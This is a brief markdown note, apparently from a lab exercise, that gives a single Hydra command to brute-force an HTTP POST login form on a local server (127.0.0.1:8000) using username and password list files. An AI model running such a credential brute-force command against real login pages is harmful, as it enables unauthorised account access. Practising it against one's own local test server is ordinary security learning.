# Hydra Attack

### I used following command to attack the webpage: 
hydra -L user.txt -P password.txt 127.0.0.1 -s 8000 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect".
